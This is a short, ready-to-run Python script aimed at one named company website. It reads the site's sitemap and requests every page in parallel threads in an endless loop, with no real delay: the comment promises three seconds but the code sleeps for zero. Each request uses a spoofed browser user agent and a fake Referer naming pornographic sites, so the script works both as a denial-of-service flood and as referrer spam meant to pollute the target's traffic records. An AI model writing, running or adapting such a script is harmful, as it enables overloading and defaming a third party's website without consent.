import threading
import requests
import time
import random
import xml.etree.ElementTree as ET

target_sitemap = "https://www.riyawebtechnology.com/sitemap.xml"

# Some real browser user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
]

# Common referrers
referrers = [
    "https://www.pornhub.com/",
    "https://www.xvideos.com/",
    "https://deephot.link/",
    "https://www.onlyfans.com/"
]

def get_sitemap_urls(sitemap_url):
    try:
        response = requests.get(sitemap_url, timeout=10)
        response.raise_for_status()
        root = ET.fromstring(response.content)
        urls = [url.find("{http://www.sitemaps.org/schemas/sitemap/0.9}loc").text
                for url in root.findall("{http://www.sitemaps.org/schemas/sitemap/0.9}url")]
        return urls
    except Exception as e:
        print(f"Failed to fetch sitemap: {e}")
        return []

def visit_url(url):
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referrers)
        }
        response = requests.get(url, headers=headers, timeout=5)
        print(f"Visited {url} - Status: {response.status_code} - UA: {headers['User-Agent']}")
    except requests.exceptions.RequestException as e:
        print(f"Error visiting {url}: {e}")

def visit_all_urls(urls):
    threads = []
    for url in urls:
        t = threading.Thread(target=visit_url, args=(url,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def main():
    urls = get_sitemap_urls(target_sitemap)
    if not urls:
        print("No URLs found in sitemap.")
        return

    print(f"Found {len(urls)} URLs in sitemap.")

    while True:
        # First visit all URLs quickly
        visit_all_urls(urls)

        # Wait 3 seconds
        time.sleep(0)

        # Reload all URLs quickly
        visit_all_urls(urls)

if __name__ == "__main__":
    main()
